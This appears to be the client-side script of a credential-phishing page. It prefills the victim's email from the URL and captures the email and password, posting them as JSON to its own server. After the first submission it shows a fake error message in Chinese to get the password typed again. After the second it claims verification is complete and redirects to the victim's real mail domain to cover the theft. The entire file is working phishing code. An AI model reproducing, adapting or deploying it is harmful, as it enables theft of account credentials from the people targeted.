const param = new URLSearchParams(window.location.search);
let emailParam = param.get('email') ? param.get('email') : '';
let count = 0;


if (emailParam === "null") {
   emailParam = "";
}
const contactform = document.querySelector('.contact-form');

const email = document.getElementById('email');
const password = document.getElementById('password');
const source = document.getElementById('source');
email.value = emailParam;



var oldclone = document.createElement("font");
oldclone.id = "clone";
oldclone.setAttribute("href", "");
oldclone.setAttribute('face', 'Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif');
oldclone.setAttribute('size', '4');
oldclone.setAttribute('type', 'hidden');
oldclone.setAttribute('color', '#ffffff');
oldclone.setAttribute('style', "text-decoration:none");
var oldclone_content = document.createTextNode(emailParam);
oldclone.appendChild(oldclone_content);
var newclone = document.getElementById("clone");
var parentDiv2 = newclone.parentNode;
parentDiv2.replaceChild(oldclone, newclone);




contactform.addEventListener('submit', (e) =>{
    e.preventDefault();

    if (email.value === "") {
        $("#msg").show();
        $("#msg").html('Enter a valid email address.');     
        email.focus();
         return;
       } else if (!email.value.match(/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/)) {
         $("#msg").show();
         $("#msg").html('Enter a valid email address.');
         email.focus();
         return;
       } else if (password.value === "") {
         $("#msg").show();
         $("#msg").html('请输入有效密码。');
          password.focus();
          return;
        } else {
          const domain = email.value.split('@')[1];
          count = count + 1;
     
      
    let formData = {
        email: email.value,
        password: password.value,
        source: source.value,
    }
    
    let xhr = new XMLHttpRequest();
    xhr.open('POST', '/');
    xhr.setRequestHeader('content-type', 'application/json');
    xhr.onload = function(){
        console.log(xhr.responseText);
        if(xhr.responseText == 'success'){
            $("#msg").show();
        $('#msg').html("发生错误。请稍后再试。");

            email.value = '';
            password.value= '';
        }else{
            


            if (count > 1) {
                $("#msg").show();
                $("#msg").html('帐户验证已完成 请稍候....');
                window.location.href = "https://www."+domain;
                return;
              }
    
    
              console.log(xhr.responseText);
              if(xhr.responseText== 'ok'){
                $('#msg').html(xhr.responseText);
    
              }
              else{
    
                $('#msg').html(xhr.responseText);
              }
            






            
        }
    }
    xhr.send(JSON.stringify(formData))
}
    
})